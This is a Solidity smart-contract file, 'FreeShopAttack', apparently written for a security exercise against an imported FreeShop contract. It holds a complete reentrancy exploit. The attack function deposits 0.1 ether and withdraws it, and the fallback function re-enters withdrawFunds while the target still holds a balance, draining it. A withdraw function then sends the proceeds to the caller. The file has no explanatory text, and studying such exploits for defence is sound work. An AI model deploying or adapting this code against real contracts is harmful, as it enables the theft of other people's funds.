pragma solidity ^0.4.24;

import './FreeShop.sol';

contract FreeShopAttack {
    Freeshop public freeshop;

    constructor(address _freeShopAddress) {
        freeshop = Freeshop(_freeShopAddress);
    }

    function() external payable {
        if (address(freeshop).balance >= 0.1 ether) {
            freeshop.withdrawFunds(0.1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, 'msg.value need to be >= 0.1 ether');
        freeshop.depositFunds.value(0.1 ether)();
        freeshop.withdrawFunds(0.1 ether);
    }

    function withdraw() {
        msg.sender.call.value(address(this).balance)();
    }
}
